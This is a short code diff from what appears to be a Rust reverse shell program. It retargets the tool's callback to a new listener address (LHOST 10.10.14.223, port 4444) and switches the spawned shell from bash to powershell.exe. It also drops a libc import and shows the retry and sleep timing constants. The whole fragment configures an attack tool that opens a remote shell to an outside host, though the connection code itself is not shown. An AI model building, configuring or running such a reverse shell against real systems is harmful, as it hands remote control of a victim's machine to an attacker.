@@ -10,7 +10,6 @@
 extern crate env_logger;
 #[macro_use]
 extern crate log;
-extern crate libc;
 
 use std::net::*;
 use std::process::*;
@@ -20,9 +19,9 @@ use std::sync::Arc;
 use std::time::Duration;
 use std::sync::atomic::{AtomicBool, Ordering};
 
-const LHOST : &str = "192.168.86.147";
+const LHOST : &str = "10.10.14.223";
 const LPORT : &str = "4444";
-const SHELL_TYPE : &str = "bash";
+const SHELL_TYPE : &str = "powershell.exe";
 const RETRY_DELAY_MS : u64 = 2_000;
 const SLEEP_DURATION_MS : u64 = 20;
 
